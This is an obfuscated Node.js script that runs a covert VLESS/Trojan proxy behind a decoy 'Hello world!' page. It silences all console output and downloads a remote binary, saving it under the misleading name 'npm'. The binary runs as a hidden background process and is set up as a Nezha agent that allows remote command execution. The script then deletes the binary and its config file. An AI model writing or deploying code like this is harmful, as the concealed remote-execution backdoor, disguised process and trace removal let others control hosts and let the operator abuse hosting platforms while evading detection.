const _0x52e4=['8.8.4.4','2083','apply','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2087','Server','config.yaml','type','application/json','PORT','Unknown','Not\x20Found\x0a','setsid\x20nohup\x20./npm\x20-s\x20','pipe','warn','WSPATH','then','slice','npm\x20download\x20successfully','writeFileSync','catch','info','vless://','debug','test','close','crypto','pop','log','console','https://amd64.ssss.nyc.mn/agent','error','utf8','NAME','client_secret:\x20','exception','includes','buffer','data','sub','country_code','error:\x20','https://api.ip.sb/geoip','npm','NEZHA_SERVER','Hello\x20world!','&type=A','@cdns.doon.eu.org:443?security=tls&sni=','unlink','npm\x20running\x20error:','concat','NEZHA_KEY','update','find','arm','toString','digest','net','join','DOMAIN','length','443','--tls','reduce','http','return\x20(function()\x20','readUInt8','map','write','Failed\x20to\x20resolve\x20','end','2096','readUInt16BE','env','&fp=chrome&type=ws&host=','url','createHash','compile','isp','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','hex','readFile','A2F6C82C-1156-42AAA-87C5-29B5A6D8BDE3','Server\x20is\x20running\x20on\x20port\x20','connect','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','index.html','https://','text/plain','writeHead','text/html','createWriteStream','Answer','{}.constructor(\x22return\x20this\x22)(\x20)'];const _0x5564=function(_0x52e4fd,_0x556497){_0x52e4fd=_0x52e4fd-0x0;let _0x409a72=_0x52e4[_0x52e4fd];return _0x409a72;};const _0x3ce2b1=function(){let _0x3dcd22=!![];return function(_0x29fb9c,_0x594391){const _0x142006=_0x3dcd22?function(){if(_0x594391){const _0x3908fd=_0x594391[_0x5564('0x2')](_0x29fb9c,arguments);_0x594391=null;return _0x3908fd;}}:function(){};_0x3dcd22=![];return _0x142006;};}();const _0x5acfd2=_0x3ce2b1(this,function(){const _0x4aedaa=function(){const _0x44cef4=_0x4aedaa['constructor']('return\x20/\x22\x20+\x20this\x20+\x20\x22/')()[_0x5564('0x4d')]('^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}');return!_0x44cef4[_0x5564('0x18')](_0x5acfd2);};return _0x4aedaa();});_0x5acfd2();const _0x45573b=function(){let _0x287a2d=!![];return function(_0x4e4ea0,_0x87ec24){const _0x3dbb51=_0x287a2d?function(){if(_0x87ec24){const _0x2f1c20=_0x87ec24['apply'](_0x4e4ea0,arguments);_0x87ec24=null;return _0x2f1c20;}}:function(){};_0x287a2d=![];return _0x3dbb51;};}();const _0x19735b=_0x45573b(this,function(){const _0x176b80=function(){};const _0x4f01ad=function(){let _0x48272a;try{_0x48272a=Function(_0x5564('0x41')+_0x5564('0x5d')+');')();}catch(_0x5b1606){_0x48272a=window;}return _0x48272a;};const _0x149f45=_0x4f01ad();if(!_0x149f45[_0x5564('0x1d')]){_0x149f45[_0x5564('0x1d')]=function(_0x162f35){const _0x35d9f7={};_0x35d9f7[_0x5564('0x1c')]=_0x162f35;_0x35d9f7[_0x5564('0xe')]=_0x162f35;_0x35d9f7[_0x5564('0x17')]=_0x162f35;_0x35d9f7[_0x5564('0x15')]=_0x162f35;_0x35d9f7[_0x5564('0x1f')]=_0x162f35;_0x35d9f7['exception']=_0x162f35;_0x35d9f7['table']=_0x162f35;_0x35d9f7['trace']=_0x162f35;return _0x35d9f7;}(_0x176b80);}else{_0x149f45['console']['log']=_0x176b80;_0x149f45[_0x5564('0x1d')]['warn']=_0x176b80;_0x149f45['console']['debug']=_0x176b80;_0x149f45['console'][_0x5564('0x15')]=_0x176b80;_0x149f45[_0x5564('0x1d')]['error']=_0x176b80;_0x149f45['console'][_0x5564('0x23')]=_0x176b80;_0x149f45[_0x5564('0x1d')]['table']=_0x176b80;_0x149f45[_0x5564('0x1d')]['trace']=_0x176b80;}});_0x19735b();const os=require('os');const http=require(_0x5564('0x40'));const fs=require('fs');const axios=require('axios');const net=require(_0x5564('0x39'));const path=require('path');const crypto=require(_0x5564('0x1a'));const {Buffer}=require(_0x5564('0x25'));const {exec,execSync}=require('child_process');const {WebSocket,createWebSocketStream}=require('ws');const UUID=process[_0x5564('0x49')]['UUID']||_0x5564('0x52');const NEZHA_SERVER=process['env'][_0x5564('0x2c')]||'';const NEZHA_PORT=process['env']['NEZHA_PORT']||'';const NEZHA_KEY=process[_0x5564('0x49')][_0x5564('0x33')]||'';const DOMAIN=process['env'][_0x5564('0x3b')]||'1234.abc.com';const AUTO_ACCESS=process['env']['AUTO_ACCESS']||![];const WSPATH=process['env'][_0x5564('0xf')]||UUID['slice'](0x0,0x8);const SUB_PATH=process['env']['SUB_PATH']||_0x5564('0x27');const NAME=process['env'][_0x5564('0x21')]||'';const PORT=process['env'][_0x5564('0x9')]||0xbb8;let ISP='';const GetISP=async()=>{try{const _0x180971=await axios['get'](_0x5564('0x2a'));const _0x582472=_0x180971[_0x5564('0x26')];ISP=(_0x582472[_0x5564('0x28')]+'-'+_0x582472[_0x5564('0x4e')])['replace'](/ /g,'_');}catch(_0x10e644){ISP=_0x5564('0xa');}};GetISP();const httpServer=http['createServer']((_0x324f39,_0x2b1c06)=>{if(_0x324f39['url']==='/'){const _0xd9459e=path[_0x5564('0x3a')](__dirname,_0x5564('0x56'));fs[_0x5564('0x51')](_0xd9459e,_0x5564('0x20'),(_0x5a1025,_0x36de22)=>{if(_0x5a1025){_0x2b1c06['writeHead'](0xc8,{'Content-Type':_0x5564('0x5a')});_0x2b1c06['end'](_0x5564('0x2d'));return;}_0x2b1c06['writeHead'](0xc8,{'Content-Type':'text/html'});_0x2b1c06['end'](_0x36de22);});return;}else if(_0x324f39[_0x5564('0x4b')]==='/'+SUB_PATH){const _0x4b5c75=NAME?NAME+'-'+ISP:ISP;const _0x514c18=_0x5564('0x16')+UUID+'@cdns.doon.eu.org:443?encryption=none&security=tls&sni='+DOMAIN+_0x5564('0x4a')+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x4b5c75;const _0x4a3750='trojan://'+UUID+_0x5564('0x2f')+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x4b5c75;const _0x260f02=_0x514c18+'\x0a'+_0x4a3750;const _0x504fa4=Buffer['from'](_0x260f02)['toString']('base64');_0x2b1c06['writeHead'](0xc8,{'Content-Type':_0x5564('0x58')});_0x2b1c06[_0x5564('0x46')](_0x504fa4+'\x0a');}else{_0x2b1c06[_0x5564('0x59')](0x194,{'Content-Type':'text/plain'});_0x2b1c06[_0x5564('0x46')](_0x5564('0xb'));}});const wss=new WebSocket[(_0x5564('0x5'))]({'server':httpServer});const uuid=UUID['replace'](/-/g,'');const DNS_SERVERS=[_0x5564('0x0'),'1.1.1.1'];function resolveHost(_0x4846b4){return new Promise((_0x573ec4,_0x41ba3b)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x4846b4)){_0x573ec4(_0x4846b4);return;}let _0x4c14cf=0x0;function _0x20a91d(){if(_0x4c14cf>=DNS_SERVERS['length']){_0x41ba3b(new Error(_0x5564('0x45')+_0x4846b4+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x2eae6d=DNS_SERVERS[_0x4c14cf];_0x4c14cf++;const _0x21e539='https://dns.google/resolve?name='+encodeURIComponent(_0x4846b4)+_0x5564('0x2e');axios['get'](_0x21e539,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x5564('0x10')](_0xc913a5=>{const _0x5bcf98=_0xc913a5['data'];if(_0x5bcf98['Status']===0x0&&_0x5bcf98['Answer']&&_0x5bcf98[_0x5564('0x5c')][_0x5564('0x3c')]>0x0){const _0x391d7b=_0x5bcf98['Answer'][_0x5564('0x35')](_0x3532db=>_0x3532db[_0x5564('0x7')]===0x1);if(_0x391d7b){_0x573ec4(_0x391d7b['data']);return;}}_0x20a91d();})['catch'](_0x5201d8=>{_0x20a91d();});}_0x20a91d();});}function handleVlessConnection(_0x42eba6,_0x5733bd){const [_0x312bb4]=_0x5733bd;const _0x5e6984=_0x5733bd['slice'](0x1,0x11);if(!_0x5e6984['every']((_0x51be0d,_0x42a6f7)=>_0x51be0d==parseInt(uuid['substr'](_0x42a6f7*0x2,0x2),0x10)))return![];let _0x36521c=_0x5733bd[_0x5564('0x11')](0x11,0x12)['readUInt8']()+0x13;const _0x8b1214=_0x5733bd['slice'](_0x36521c,_0x36521c+=0x2)[_0x5564('0x48')](0x0);const _0x1ae324=_0x5733bd[_0x5564('0x11')](_0x36521c,_0x36521c+=0x1)[_0x5564('0x42')]();const _0x461386=_0x1ae324==0x1?_0x5733bd[_0x5564('0x11')](_0x36521c,_0x36521c+=0x4)[_0x5564('0x3a')]('.'):_0x1ae324==0x2?new TextDecoder()['decode'](_0x5733bd['slice'](_0x36521c+0x1,_0x36521c+=0x1+_0x5733bd[_0x5564('0x11')](_0x36521c,_0x36521c+0x1)[_0x5564('0x42')]())):_0x1ae324==0x3?_0x5733bd['slice'](_0x36521c,_0x36521c+=0x10)[_0x5564('0x3f')]((_0x3c25a5,_0x2fbd40,_0x2a9065,_0xf4ca57)=>_0x2a9065%0x2?_0x3c25a5['concat'](_0xf4ca57['slice'](_0x2a9065-0x1,_0x2a9065+0x1)):_0x3c25a5,[])[_0x5564('0x43')](_0x59b859=>_0x59b859['readUInt16BE'](0x0)[_0x5564('0x37')](0x10))['join'](':'):'';_0x42eba6['send'](new Uint8Array([_0x312bb4,0x0]));const _0x2f4185=createWebSocketStream(_0x42eba6);resolveHost(_0x461386)[_0x5564('0x10')](_0xe0934f=>{net[_0x5564('0x54')]({'host':_0xe0934f,'port':_0x8b1214},function(){this['write'](_0x5733bd['slice'](_0x36521c));_0x2f4185['on'](_0x5564('0x1f'),()=>{})[_0x5564('0xd')](this)['on']('error',()=>{})[_0x5564('0xd')](_0x2f4185);})['on']('error',()=>{});})['catch'](_0x344140=>{net['connect']({'host':_0x461386,'port':_0x8b1214},function(){this[_0x5564('0x44')](_0x5733bd[_0x5564('0x11')](_0x36521c));_0x2f4185['on']('error',()=>{})[_0x5564('0xd')](this)['on'](_0x5564('0x1f'),()=>{})[_0x5564('0xd')](_0x2f4185);})['on'](_0x5564('0x1f'),()=>{});});return!![];}function handleTrojanConnection(_0x206aae,_0x27d8b6){try{if(_0x27d8b6['length']<0x3a)return![];const _0x1ba9ef=_0x27d8b6['slice'](0x0,0x38)['toString']();const _0x5a2390=[UUID];let _0x3ddbf1=null;for(const _0x59c7fa of _0x5a2390){const _0x2f1d81=crypto[_0x5564('0x4c')]('sha224')[_0x5564('0x34')](_0x59c7fa)[_0x5564('0x38')](_0x5564('0x50'));if(_0x2f1d81===_0x1ba9ef){_0x3ddbf1=_0x59c7fa;break;}}if(!_0x3ddbf1)return![];let _0x5b5e54=0x38;if(_0x27d8b6[_0x5b5e54]===0xd&&_0x27d8b6[_0x5b5e54+0x1]===0xa){_0x5b5e54+=0x2;}const _0x4cd675=_0x27d8b6[_0x5b5e54];if(_0x4cd675!==0x1)return![];_0x5b5e54+=0x1;const _0x317c31=_0x27d8b6[_0x5b5e54];_0x5b5e54+=0x1;let _0x2b28f7,_0x276d06;if(_0x317c31===0x1){_0x2b28f7=_0x27d8b6[_0x5564('0x11')](_0x5b5e54,_0x5b5e54+0x4)[_0x5564('0x3a')]('.');_0x5b5e54+=0x4;}else if(_0x317c31===0x3){const _0x196d46=_0x27d8b6[_0x5b5e54];_0x5b5e54+=0x1;_0x2b28f7=_0x27d8b6[_0x5564('0x11')](_0x5b5e54,_0x5b5e54+_0x196d46)['toString']();_0x5b5e54+=_0x196d46;}else if(_0x317c31===0x4){_0x2b28f7=_0x27d8b6['slice'](_0x5b5e54,_0x5b5e54+0x10)['reduce']((_0xc4c8a7,_0x6ecabe,_0x299c25,_0x548efe)=>_0x299c25%0x2?_0xc4c8a7[_0x5564('0x32')](_0x548efe[_0x5564('0x11')](_0x299c25-0x1,_0x299c25+0x1)):_0xc4c8a7,[])[_0x5564('0x43')](_0x3a57eb=>_0x3a57eb['readUInt16BE'](0x0)[_0x5564('0x37')](0x10))['join'](':');_0x5b5e54+=0x10;}else{return![];}_0x276d06=_0x27d8b6[_0x5564('0x48')](_0x5b5e54);_0x5b5e54+=0x2;if(_0x5b5e54<_0x27d8b6['length']&&_0x27d8b6[_0x5b5e54]===0xd&&_0x27d8b6[_0x5b5e54+0x1]===0xa){_0x5b5e54+=0x2;}const _0x5589ff=createWebSocketStream(_0x206aae);resolveHost(_0x2b28f7)[_0x5564('0x10')](_0x26ee65=>{net['connect']({'host':_0x26ee65,'port':_0x276d06},function(){if(_0x5b5e54<_0x27d8b6['length']){this['write'](_0x27d8b6[_0x5564('0x11')](_0x5b5e54));}_0x5589ff['on'](_0x5564('0x1f'),()=>{})[_0x5564('0xd')](this)['on'](_0x5564('0x1f'),()=>{})['pipe'](_0x5589ff);})['on']('error',()=>{});})[_0x5564('0x14')](_0x48da6d=>{net[_0x5564('0x54')]({'host':_0x2b28f7,'port':_0x276d06},function(){if(_0x5b5e54<_0x27d8b6['length']){this[_0x5564('0x44')](_0x27d8b6['slice'](_0x5b5e54));}_0x5589ff['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x5589ff);})['on']('error',()=>{});});return!![];}catch(_0x3e0e98){return![];}}wss['on']('connection',(_0x55d6bd,_0x448995)=>{const _0x1d6f71=_0x448995['url']||'';_0x55d6bd['once']('message',_0x568118=>{if(_0x568118['length']>0x11&&_0x568118[0x0]===0x0){const _0x160e20=_0x568118['slice'](0x1,0x11);const _0x229460=_0x160e20['every']((_0x4ac3c3,_0x13ad61)=>_0x4ac3c3==parseInt(uuid['substr'](_0x13ad61*0x2,0x2),0x10));if(_0x229460){if(!handleVlessConnection(_0x55d6bd,_0x568118)){_0x55d6bd['close']();}return;}}if(!handleTrojanConnection(_0x55d6bd,_0x568118)){_0x55d6bd[_0x5564('0x19')]();}})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x1d3881=os['arch']();if(_0x1d3881===_0x5564('0x36')||_0x1d3881==='arm64'||_0x1d3881==='aarch64'){if(!NEZHA_PORT){return'https://arm64.ssss.nyc.mn/v1';}else{return'https://arm64.ssss.nyc.mn/agent';}}else{if(!NEZHA_PORT){return'https://amd64.ssss.nyc.mn/v1';}else{return _0x5564('0x1e');}}};const downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3bc904=getDownloadUrl();const _0x104a5d=await axios({'method':'get','url':_0x3bc904,'responseType':'stream'});const _0x1d091c=fs[_0x5564('0x5b')]('npm');_0x104a5d['data'][_0x5564('0xd')](_0x1d091c);return new Promise((_0x5459d4,_0x4ac013)=>{_0x1d091c['on']('finish',()=>{console[_0x5564('0x1c')](_0x5564('0x12'));exec('chmod\x20+x\x20npm',_0xc5fb58=>{if(_0xc5fb58)_0x4ac013(_0xc5fb58);_0x5459d4();});});_0x1d091c['on'](_0x5564('0x1f'),_0x4ac013);});}catch(_0x1e8cd1){throw _0x1e8cd1;}};const runnz=async()=>{try{const _0x37440d=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x37440d['trim']()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x217106){}await downloadFile();let _0x3b65dd='';let _0x3eed43=[_0x5564('0x3d'),'8443',_0x5564('0x47'),_0x5564('0x4'),_0x5564('0x1'),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3361a0=_0x3eed43['includes'](NEZHA_PORT)?_0x5564('0x3e'):'';_0x3b65dd=_0x5564('0xc')+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x3361a0+_0x5564('0x4f');}else if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1a273a=NEZHA_SERVER[_0x5564('0x24')](':')?NEZHA_SERVER['split'](':')[_0x5564('0x1b')]():'';const _0x582300=_0x3eed43['includes'](_0x1a273a)?'true':'false';const _0x562df1=_0x5564('0x22')+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x5564('0x55')+_0x582300+_0x5564('0x3')+UUID;fs[_0x5564('0x13')]('config.yaml',_0x562df1);}_0x3b65dd='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x5564('0x1c')]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}try{exec(_0x3b65dd,{'shell':'/bin/bash'},_0x28f007=>{if(_0x28f007)console['error'](_0x5564('0x31'),_0x28f007);else console[_0x5564('0x1c')]('npm\x20is\x20running');});}catch(_0x15c0b4){console['error'](_0x5564('0x29')+_0x15c0b4);}};async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN){return;}const _0x4251c4=_0x5564('0x57')+DOMAIN+'/'+SUB_PATH;try{const _0x25fa1e=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x4251c4},{'headers':{'Content-Type':_0x5564('0x8')}});console[_0x5564('0x1c')]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x11d5ab){}}const delFiles=()=>{fs['unlink'](_0x5564('0x2b'),()=>{});fs[_0x5564('0x30')](_0x5564('0x6'),()=>{});};httpServer['listen'](PORT,()=>{runnz();setTimeout(()=>{delFiles();},0x2bf20);addAccessTask();console[_0x5564('0x1c')](_0x5564('0x53')+PORT);});
